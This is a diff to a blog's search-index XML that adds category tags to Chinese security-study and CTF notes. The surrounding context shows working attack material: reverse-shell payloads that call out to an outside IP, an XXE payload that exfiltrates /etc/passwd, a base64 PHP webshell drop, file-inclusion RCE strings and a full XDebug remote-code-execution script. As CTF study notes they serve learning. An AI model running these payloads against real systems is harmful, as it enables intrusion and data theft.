@@ -60,6 +60,10 @@
 </tbody>
 </table>
 ]]></content>
+      <categories>
+        <category>信息安全工程师</category>
+        <category>密码</category>
+      </categories>
   </entry>
   <entry>
     <title>安全</title>
@@ -597,6 +601,10 @@ M834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">�
 <p>通过这些加固技术，开发者可以有效提高 Android 应用的安全性，减少被攻击的风险。</p>
 <h1 id="19漏洞分类"><a class="markdownIt-Anchor" href="#19漏洞分类"></a> 19.漏洞分类:</h1>
 ]]></content>
+      <categories>
+        <category>信息安全工程师</category>
+        <category>信安原理基础</category>
+      </categories>
   </entry>
   <entry>
     <title>恶意代码</title>
@@ -723,6 +731,10 @@ M834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">�
 <li><strong>发作阶段（破坏期）</strong> 病毒在此阶段执行最终的恶意操作，可能表现为数据破坏（如文件加密勒索）、资源占用（如DDoS攻击）或信息窃取（如键盘记录）。防御手段包括实时行为监控、网络流量分析以及离线备份机制以确保数据可恢复。</li>
 </ol>
 ]]></content>
+      <categories>
+        <category>信息安全工程师</category>
+        <category>信安原理基础</category>
+      </categories>
   </entry>
   <entry>
     <title>应用</title>
@@ -941,6 +953,10 @@ M834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">�
 </tbody>
 </table>
 ]]></content>
+      <categories>
+        <category>信息安全工程师</category>
+        <category>密码</category>
+      </categories>
   </entry>
   <entry>
     <title>linxu</title>
@@ -997,18 +1013,30 @@ M834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">�
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> <span class="built_in">setTimeout</span>(resolve, <span class="number">1</span>))</span><br></pre></td></tr></table></figure>
 <h2 id="6webpack"><a class="markdownIt-Anchor" href="#6webpack"></a> 6.webpack:</h2>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">都有类似这样的加载器:    </span><br><span class="line">!<span class="function"><span class="keyword">function</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> s = &#123;&#125;;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params">t</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (s[t])</span><br><span class="line">            <span class="keyword">return</span> s[t].exports;</span><br><span class="line">        <span class="keyword">var</span> e = s[t] = &#123;</span><br><span class="line">            i: t,</span><br><span class="line">            l: !<span class="number">1</span>,</span><br><span class="line">            exports: &#123;&#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">return</span> i[t].<span class="title function_ invoke__">call</span>(e.exports, e, e.exports, n),</span><br><span class="line">        e.l = !<span class="number">0</span>,</span><br><span class="line">        e.exports</span><br><span class="line">    &#125;</span><br><span class="line">    window.wanyan = n;     ---用全局对象去导出</span><br><span class="line">&#125;(&#123;</span><br><span class="line">                       ---这里面放加载的模块键值对的形式</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>渗透学习</category>
+        <category>JS_逆向</category>
+      </categories>
   </entry>
   <entry>
     <title>jwt</title>
     <url>/2025/11/01/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/ctfshow/jwt/</url>
     <content><![CDATA[<h2 id="1使用flask-unsign伪造"><a class="markdownIt-Anchor" href="#1使用flask-unsign伪造"></a> 1.使用flask-unsign伪造:</h2>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line">破解秘钥并解密:</span><br><span class="line">flask-unsign --decode --cookie <span class="string">&#x27;eyJ1c2VybmFtZSI6ImxieiJ9.ZoO6sQ.1qmeqKQDnxZyPqeCWGtw_50wWss&#x27;</span></span><br><span class="line"></span><br><span class="line">破解秘钥并输出秘钥:</span><br><span class="line">flask-unsign --unsign --cookie <span class="string">&#x27;eyJ1c2VybmFtZSI6ImxieiJ9.ZoO6sQ.1qmeqKQDnxZyPqeCWGtw_50wWss&#x27;</span></span><br><span class="line"></span><br><span class="line">生成session:</span><br><span class="line">flask-unsign --sign --cookie <span class="string">&#x27;&#123;&quot;username&quot;:&quot;lbz&quot;,&quot;passwd&quot;:&quot;123&quot;&#125;&#x27;</span> --secret <span class="string">&#x27;hello&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>渗透学习</category>
+        <category>ctfshow</category>
+      </categories>
   </entry>
   <entry>
     <title>java</title>
     <url>/2025/11/01/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/ctfshow/java/</url>
     <content><![CDATA[<h1 id="java反汇编"><a class="markdownIt-Anchor" href="#java反汇编"></a> java反汇编</h1>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -jar cfr.jar app.jar --outputdir src</span><br><span class="line">            ---app.jar为指定文件java -version</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>渗透学习</category>
+        <category>ctfshow</category>
+      </categories>
   </entry>
   <entry>
     <title>操作系统</title>
@@ -1545,6 +1573,10 @@ M834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">�
 <li><strong>常见命令</strong>：<code>reboot</code>。</li>
 </ul>
 ]]></content>
+      <categories>
+        <category>信息安全工程师</category>
+        <category>操作系统</category>
+      </categories>
   </entry>
   <entry>
     <title>linxu</title>
@@ -1597,6 +1629,10 @@ M834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">�
 </tbody>
 </table>
 ]]></content>
+      <categories>
+        <category>渗透学习</category>
+        <category>ctfshow</category>
+      </categories>
   </entry>
   <entry>
     <title>nodejs</title>
@@ -1702,6 +1738,10 @@ M834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">�
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">payload</span>:</span><br><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/139.224.54.229/9090 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
 <h2 id="3jade的rce"><a class="markdownIt-Anchor" href="#3jade的rce"></a> 3.jade的rce:</h2>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>: &#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;Block&quot;</span>,<span class="string">&quot;nodes&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;compileDebug&quot;</span>:<span class="number">1</span>,<span class="string">&quot;self&quot;</span>:<span class="number">1</span>,<span class="string">&quot;line&quot;</span>:<span class="string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/139.224.54.229/9090 0&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line">注意:   <span class="title class_">Content</span>-<span class="title class_">Type</span>:application/json</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>渗透学习</category>
+        <category>ctfshow</category>
+      </categories>
   </entry>
   <entry>
     <title>php特性</title>
@@ -1926,6 +1966,10 @@ M834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">�
 <li>第一个参数 <code>$pattern</code> 必能能够匹配到第三个参数 <code>subject</code> （否则 <code>preg_replace()</code> 函数会返回 <code>subject</code> 而不会执行 <code>replacement</code> 命令）</li>
 </ul>
 ]]></content>
+      <categories>
+        <category>渗透学习</category>
+        <category>ctfshow</category>
+      </categories>
   </entry>
   <entry>
     <title>ssrf</title>
@@ -2099,6 +2143,10 @@ M834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">�
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 gopherus.py --exploit fastcgi</span><br><span class="line">它只要求一个必须存在于受害者系统中的文件（最好是.php文件），顺便说一句，我们有默认的文件。</span><br><span class="line"></span><br><span class="line">if you don&#x27;t know press ENTER we have default one:  /var/www/html/index.php                                    </span><br><span class="line">Terminal command to run:  echo PD9waHAgZXZhbCgkX1BPU1RbMV0pOzs/Pgo= | base64 -d &gt; /var/www/html/1.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <h2 id="4打redis"><a class="markdownIt-Anchor" href="#4打redis"></a> 4.打redis:</h2>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 gopherus.py --exploit redis</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>渗透学习</category>
+        <category>ctfshow</category>
+      </categories>
   </entry>
   <entry>
     <title>xxe</title>
@@ -2157,6 +2205,10 @@ M834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">�
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">  &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;   ---这个位置可以换成php伪协议  </span><br><span class="line">  &lt;!ENTITY % dtd SYSTEM &quot;http://139.224.54.229/xxe.dtd&quot;&gt;</span><br><span class="line">  %dtd;</span><br><span class="line">  %send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;send;&lt;/root&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <h2 id="3一些绕过"><a class="markdownIt-Anchor" href="#3一些绕过"></a> 3.一些绕过</h2>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">可以对数据进行UTF-<span class="number">16</span>编码绕过(使用python)</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>渗透学习</category>
+        <category>ctfshow</category>
+      </categories>
   </entry>
   <entry>
     <title>xss</title>
@@ -2359,12 +2411,20 @@ M834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">�
 </tbody>
 </table>
 ]]></content>
+      <categories>
+        <category>渗透学习</category>
+        <category>ctfshow</category>
+      </categories>
   </entry>
   <entry>
     <title>内网渗透</title>
     <url>/2025/11/01/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/ctfshow/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
     <content><![CDATA[<h1 id="命令执行"><a class="markdownIt-Anchor" href="#命令执行"></a> 命令执行:</h1>
 <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">conhost.exe --headless <span class="built_in">cmd</span> /c c:\windows\system32\calc.exe</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>渗透学习</category>
+        <category>ctfshow</category>
+      </categories>
   </entry>
   <entry>
     <title>反序列化</title>
@@ -2797,6 +2857,10 @@ M834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">�
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">session_start</span>()，这里php的版本是<span class="number">7.3</span>.<span class="number">11</span>，所以就是默认就是<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br></pre></td></tr></table></figure>
 <h3 id="6php地址引用"><a class="markdownIt-Anchor" href="#6php地址引用"></a> 6.php地址引用:</h3>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">如果需要一个值等于另一个的地址   ---&amp;$   ---&amp;取地址</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>渗透学习</category>
+        <category>ctfshow</category>
+      </categories>
   </entry>
   <entry>
     <title>sql注入</title>
@@ -3939,6 +4003,10 @@ M834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">�
 </table>
 <h4 id="sqlmap-注入技术参数technique"><a class="markdownIt-Anchor" href="#sqlmap-注入技术参数technique"></a> Sqlmap 注入技术参数(–technique):</h4>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--technique    </span></span><br><span class="line">B：<span class="type">Boolean</span><span class="operator">-</span>based blind（布尔型注入）</span><br><span class="line">E：Error<span class="operator">-</span>based（报错型注入）</span><br><span class="line">U：<span class="keyword">Union</span> query<span class="operator">-</span>based（可联合查询注入）</span><br><span class="line">S：Stacked queries（可多语句查询注入）</span><br><span class="line">T：<span class="type">Time</span><span class="operator">-</span>based blind（基于时间延迟注入）</span><br><span class="line">Q：Inline queries（嵌套查询注入）</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>渗透学习</category>
+        <category>ctfshow</category>
+      </categories>
   </entry>
   <entry>
     <title>命令执行</title>
@@ -4045,6 +4113,10 @@ M834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">�
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mkdir(&quot;A&quot;);                         // 在当前工作目录创建目录 A</span><br><span class="line">chdir(&quot;A&quot;);                         // 进入目录 A</span><br><span class="line">mkdir(&quot;B&quot;);                         // 在 A 下创建目录 B</span><br><span class="line">chdir(&quot;B&quot;);                         // 进入 A/B</span><br><span class="line">mkdir(&quot;C&quot;);                         // 在 A/B 下创建目录 C</span><br><span class="line">chdir(&quot;C&quot;);                         // 进入 A/B/C</span><br><span class="line">mkdir(&quot;D&quot;);                         // 在 A/B/C 下创建目录 D</span><br><span class="line">chdir(&quot;D&quot;);                         // 进入 A/B/C/D</span><br><span class="line">chdir(&quot;..&quot;);                        // 返回到 A/B/C （上一级）</span><br><span class="line">chdir(&quot;..&quot;);                        // 返回到 A/B</span><br><span class="line">chdir(&quot;..&quot;);                        // 返回到 A</span><br><span class="line">chdir(&quot;..&quot;);                        // 返回到 当前脚本最初的工作目录（上上上上级）</span><br><span class="line">symlink(&quot;A/B/C/D&quot;,&quot;7abc&quot;);         // 在当前目录创建符号链接 7abc -&gt; A/B/C/D</span><br><span class="line">symlink(&quot;7abc/../../../../etc/passwd&quot;,&quot;exp&quot;); // 尝试创建符号链接 exp -&gt; ../../../../etc/passwd（通过相对路径串联指向系统文件）</span><br><span class="line">unlink(&quot;7abc&quot;);                     // 删除符号链接或文件名为 7abc（如果是目录则会失败）</span><br><span class="line">mkdir(&quot;7abc&quot;);                      // 创建一个普通目录名为 7abc（替代之前的符号链接）</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <h2 id="php74以上ffi"><a class="markdownIt-Anchor" href="#php74以上ffi"></a> php7.4以上(FFI)</h2>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);<span class="comment">//创建一个system对象</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;<span class="comment">//没有回显的     </span></span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$a</span>);<span class="comment">//通过$ffi去调用system函数</span></span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>渗透学习</category>
+        <category>ctfshow</category>
+      </categories>
   </entry>
   <entry>
     <title>文件上传</title>
@@ -4183,6 +4255,10 @@ M834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">�
 <h3 id="6通过htaccess包含"><a class="markdownIt-Anchor" href="#6通过htaccess包含"></a> 6.通过.htaccess包含:</h3>
 <p>httpd,httpd是apache的服务，关于apache的文件上传中有一个.htaccess配置文件，可以进行文件包含</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">文件为.htaccess</span><br><span class="line">    内容:</span><br><span class="line"></span><br><span class="line">    &lt;FilesMatch <span class="string">&quot;\.jpg&quot;</span>&gt;</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>渗透学习</category>
+        <category>ctfshow</category>
+      </categories>
   </entry>
   <entry>
     <title>cve</title>
@@ -4204,6 +4280,10 @@ M834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">�
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">xdebug2.x:</span><br><span class="line">xdebug.remote_connect_back = <span class="number">1</span></span><br><span class="line">xdebug.remote_enable = <span class="number">1</span></span><br><span class="line">xdebug3.x:</span><br><span class="line">xdebug.mode = debug</span><br><span class="line">xdebug.discover_client_host = <span class="number">1</span></span><br><span class="line">xdebug.client_host = <span class="number">1</span></span><br></pre></td></tr></table></figure>
 <p>该脚本只能在有公网ip的服务器或者和靶机在同一个内网</p>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">logging.basicConfig(stream=sys.stdout, level=logging.INFO, <span class="built_in">format</span>=<span class="string">&#x27;%(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line">server_done = threading.Event()</span><br><span class="line">server_started = threading.Event()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_xml</span>(<span class="params">sock: socket.socket</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    blocks = []</span><br><span class="line">    data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = data + sock.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> data:</span><br><span class="line">            eop = data.find(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> eop &lt; <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            blocks.append(data[:eop])</span><br><span class="line">            data = data[eop+<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(blocks) &gt;= <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> blocks[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">XDebugRequestHandler</span>(socketserver.BaseRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>):</span><br><span class="line">        logging.info(<span class="string">&#x27;[+] Recieve data from %s&#x27;</span>, <span class="variable language_">self</span>.client_address)</span><br><span class="line">        <span class="variable language_">self</span>.request.sendall(<span class="string">b&#x27;&#x27;</span>.join([<span class="string">b&#x27;eval -i 1 -- &#x27;</span>, base64.b64encode(<span class="variable language_">self</span>.server.code.encode()), <span class="string">b&#x27;\x00&#x27;</span>]))</span><br><span class="line">        data = recv_xml(<span class="variable language_">self</span>.request)</span><br><span class="line">        logging.info(<span class="string">&#x27;[+] Recieve data: &#x27;</span> + data.decode())</span><br><span class="line">        g = re.search(<span class="string">rb&#x27;&lt;\!\[CDATA\[([a-z0-9=\./\+]+)\]\]&gt;&#x27;</span>, data, re.I)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> g:</span><br><span class="line">            logging.warning(<span class="string">&#x27;[-] No result...&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line">        data = g.group(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            logging.info(<span class="string">&#x27;[+] Result: &#x27;</span> + base64.b64decode(data).decode())</span><br><span class="line">            server_done.<span class="built_in">set</span>()</span><br><span class="line">        <span class="keyword">except</span> binascii.Error <span class="keyword">as</span> e:</span><br><span class="line">            logging.error(<span class="string">&#x27;[-] May be not string result: %s&#x27;</span>, e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">XDebugServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, server_address, handler_class, code</span>):</span><br><span class="line">        <span class="variable language_">self</span>.code = code</span><br><span class="line">        <span class="variable language_">self</span>.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">        <span class="built_in">super</span>().__init__(server_address, handler_class)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">server_activate</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().server_activate()</span><br><span class="line">        logging.info(<span class="string">&#x27;[+] Server %s started&#x27;</span>, <span class="variable language_">self</span>.server_address)</span><br><span class="line">        server_started.<span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_dbgp_server</span>(<span class="params">port: <span class="built_in">int</span>, code: <span class="built_in">str</span></span>):</span><br><span class="line">    server = XDebugServer((<span class="string">&#x27;0.0.0.0&#x27;</span>, port), XDebugRequestHandler, code)</span><br><span class="line">    server_thread = threading.Thread(target=server.serve_forever, daemon=<span class="literal">True</span>)</span><br><span class="line">    server_thread.start()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> server_thread</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trigger_debug_session</span>(<span class="params">url: <span class="built_in">str</span>, attack_ip: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        server_started.wait(timeout=<span class="number">5</span>)</span><br><span class="line">        logging.info(<span class="string">&#x27;[+] Trigger debug session&#x27;</span>)</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> attack_ip:</span><br><span class="line">            headers[<span class="string">&#x27;X-Forwarded-For&#x27;</span>] = attack_ip</span><br><span class="line"></span><br><span class="line">        requests.get(url + <span class="string">&#x27;?XDEBUG_SESSION_START=phpstorm&amp;XDEBUG_SESSION=1&amp;XDEBUG_TRIGGER=1&#x27;</span>, headers=headers, timeout=<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;XDebug remote debug code execution.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--code&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;the code you want to execute.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--target&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;target url.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--dbgp-ip&#x27;</span>, default=<span class="string">&#x27;&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;dbgp server ip address, must can be accessed from target server.&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    start_dbgp_server(<span class="number">9000</span>, args.code)</span><br><span class="line">    start_dbgp_server(<span class="number">9003</span>, args.code)</span><br><span class="line">    threading.Thread(target=trigger_debug_session, args=(args.target, args.dbgp_ip), daemon=<span class="literal">True</span>).start()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># Wait with a timeout, but check for interrupts</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">            <span class="keyword">if</span> server_done.is_set():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            logging.error(<span class="string">&#x27;[-] Execution timed out&#x27;</span>)            </span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        logging.info(<span class="string">&#x27;[*] Received keyboard interrupt, exiting...&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>渗透学习</category>
+        <category>ctfshow</category>
+      </categories>
   </entry>
   <entry>
     <title>文件包含</title>
@@ -4231,6 +4311,10 @@ M834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">�
 <h3 id="5pear文件包含rce"><a class="markdownIt-Anchor" href="#5pear文件包含rce"></a> 5.pear文件包含(rce):</h3>
 <p>pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl/pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定<code>--with-pear</code>才会安装。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">发现Docker环境下的PHP会开启register_argc_argv这个配置。文档中对这个选项的介绍不是特别清楚，大概的意思是，当开启了这个选项，用户的输入将会被赋予给$argc、$argv、$_SERVER[&#x27;argv&#x27;]几个变量。</span><br><span class="line">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php </span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>渗透学习</category>
+        <category>ctfshow</category>
+      </categories>
   </entry>
   <entry>
     <title>常识</title>
@@ -4822,6 +4906,10 @@ M834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">�
 <p>如果 <code>employee_id</code> 是数字类型，而查询条件中 <code>'100'</code> 是字符串类型，数据库会自动将 <code>'100'</code> 转换为数字 100 来进行比较。</p>
 <p>在某些情况下，隐式转换可能会导致意外的查询结果。例如，字符串 <code>'1a11'</code> 被转换为数字时，<code>'1a11'</code> 可能会被解析为 <code>1</code>，这样查询时可能得到意料之外的结果。</p>
 ]]></content>
+      <categories>
+        <category>渗透学习</category>
+        <category>ctfshow</category>
+      </categories>
   </entry>
   <entry>
     <title>常用姿势</title>
@@ -5063,6 +5151,10 @@ M834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">�
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export LD_LIBRARY_PATH=.</span><br><span class="line">./vulnerable_binary</span><br></pre></td></tr></table></figure>
 <p>如果该程序使用了你替换的库，就能触发你自定义的函数逻辑。</p>
 ]]></content>
+      <categories>
+        <category>渗透学习</category>
+        <category>ctfshow</category>
+      </categories>
   </entry>
   <entry>
     <title>网络</title>
@@ -5212,12 +5304,20 @@ M834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">�
 <p><strong>网络层（第三层）</strong>：IPSec、MPLS VPN、IKEv2、WireGuard。</p>
 <p><strong>应用层（第七层）</strong>：SSL VPN。</p>
 ]]></content>
+      <categories>
+        <category>信息安全工程师</category>
+        <category>计算机网络</category>
+      </categories>
   </entry>
   <entry>
     <title>ida</title>
     <url>/2025/11/01/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/%E9%80%86%E5%90%91/ida/</url>
     <content><![CDATA[<h1 id=""><a class="markdownIt-Anchor" href="#"></a> </h1>
 ]]></content>
+      <categories>
+        <category>渗透学习</category>
+        <category>逆向</category>
+      </categories>
   </entry>
   <entry>
     <title>基础语法</title>
@@ -6121,6 +6221,10 @@ M834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">�
 </tbody>
 </table>
 ]]></content>
+      <categories>
+        <category>基础语言</category>
+        <category>golang</category>
+      </categories>
   </entry>
   <entry>
     <title>各种包</title>
@@ -7110,6 +7214,10 @@ M834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">�
 </tbody>
 </table>
 ]]></content>
+      <categories>
+        <category>基础语言</category>
+        <category>golang</category>
+      </categories>
   </entry>
   <entry>
     <title>mysql具体用法</title>
@@ -7197,6 +7305,10 @@ M834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">�
 <h3 id="外键"><a class="markdownIt-Anchor" href="#外键"></a> 外键</h3>
 <p><img src="C:%5CUsers%5Cwanyan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20241203170935172.png" alt="image-20241203170935172" /></p>
 ]]></content>
+      <categories>
+        <category>基础语言</category>
